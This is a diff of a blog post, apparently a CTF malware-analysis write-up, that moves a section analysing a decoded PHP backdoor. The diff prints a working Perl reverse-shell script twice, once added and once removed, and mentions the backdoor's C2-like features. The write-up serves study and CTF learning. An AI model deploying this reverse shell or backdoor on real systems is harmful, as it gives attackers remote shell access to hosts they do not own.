@@ -6,7 +6,7 @@ date:   2021-09-23 12:00:00
 tags:
 - ctf
 - malware-analysis
-- h@cktivitycon-2021
+- h@cktivitycon
 - php
 - reverse-engineering
 description: ''
@@ -226,7 +226,41 @@ if __name__ == "__main__":
 ```
 
 ## Payload Code Review and Flag
-Running my python script gets us a big string of what seems to be actual code. I'll save you the headache of looking at a whole program on one line and show the payload.
+Running my python script gets us a big string of what seems to be actual code. I'll save you the headache of looking at a whole program on one line, and I've put the full code at the bottom of this post, because it was *VERY* long.
+
+Aside from that, wow! Actual code! This seems to be some kind of backdoor-type situation based on the POST requests and the commands that are loaded in. But, it's way more beefed up than your traditional php backdoor that you'll find online. I may be wrong, but this seems to have a lot of elements that you'd associate with a C2. There's functionality to look for SUID binaries, a console option, and more ways to interact with the file than a regular reverse shell. Since this is a CTF challenge, we are not required to look through this, but I think it's well worth the time to really dive deeper into this to understand what exactly is going on.
+
+In terms of the CTF, what is interesting is the *ACTUALLY* base64 encoded strings stored in `$back_connect_p` and `$bind_port_p`. If we decode them, we can see more stuff to do with the payload. For brevity's sake, I'll just show the important part.
+
+```perl
+#!/usr/bin/perl
+use Socket;
+$iaddr=inet_aton($ARGV[0]) || die("Error: $!\n");
+$paddr=sockaddr_in($ARGV[1], $iaddr) || die("Error: $!\n");
+$proto=getprotobyname('tcp');
+socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
+connect(SOCKET, $paddr) || die("Error: $!\n");
+open(STDIN, ">&SOCKET");
+open(STDOUT, ">&SOCKET");
+open(STDERR, ">&SOCKET");
+my $str = <<END;
+begin 644 uuencode.uu
+F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
+`
+end
+END
+system('/bin/sh -i -c "echo ${string}; bash"');
+close(STDIN);
+close(STDOUT);
+close(STDERR)
+```
+
+Now clearly, this is a reverse shell script. But, what's weird is that `uuencode.uu` string in the middle of it. A little bit of googling later, and we find that this is just some way to encode and decode files, called "uuencode" because it was originally used between unix users (UNIX to UNIX). That said, we can search for a decoder online, notice that `dcode.fr` once again has everything a CTF player could need, and grab the flag.
+
+![asdf](https://an00brektn.github.io/img/Pasted image 20210923133935.png)
+
+## Final Payload
+This was cleaned up to the best of my ability with find and replace, but there were A LOT of characters to be escaped.
 
 ```php
 global $auth_pass,$color,$default_action,$default_use_ajax,$default_charset,$sort;
@@ -1746,33 +1780,3 @@ if( !empty($_POST[\'a\']) && function_exists(\'action\' . $_POST[\'a\']) )
     call_user_func(\'action\' . $_POST[\'a\']);
 exit;
 ```
-
-Wow! Actual code! This seems to be some kind of backdoor-type situation based on the POST requests and the commands that are loaded in. But, it's way more beefed up than your traditional php backdoor that you'll find online. I may be wrong, but this seems to have a lot of elements that you'd associate with a C2. There's functionality to look for SUID binaries, a console option, and more ways to interact with the file than a regular reverse shell. Since this is a CTF challenge, we are not required to look through this, but I think it's well worth the time to really dive deeper into this to understand what exactly is going on.
-In terms of the CTF, what is interesting is the *ACTUALLY* base64 encoded strings stored in `$back_connect_p` and `$bind_port_p`. If we decode them, we can see more stuff to do with the payload. For brevity's sake, I'll just show the important part.
-
-```perl
-#!/usr/bin/perl
-use Socket;
-$iaddr=inet_aton($ARGV[0]) || die("Error: $!\n");
-$paddr=sockaddr_in($ARGV[1], $iaddr) || die("Error: $!\n");
-$proto=getprotobyname('tcp');
-socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
-connect(SOCKET, $paddr) || die("Error: $!\n");
-open(STDIN, ">&SOCKET");
-open(STDOUT, ">&SOCKET");
-open(STDERR, ">&SOCKET");
-my $str = <<END;
-begin 644 uuencode.uu
-F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
-`
-end
-END
-system('/bin/sh -i -c "echo ${string}; bash"');
-close(STDIN);
-close(STDOUT);
-close(STDERR)
-```
-
-Now clearly, this is a reverse shell script. But, what's weird is that `uuencode.uu` string in the middle of it. A little bit of googling later, and we find that this is just some way to encode and decode files, called "uuencode" because it was originally used between unix users (UNIX to UNIX). That said, we can search for a decoder online, notice that `dcode.fr` once again has everything a CTF player could need, and grab the flag.
-
-![asdf](https://an00brektn.github.io/img/Pasted image 20210923133935.png)
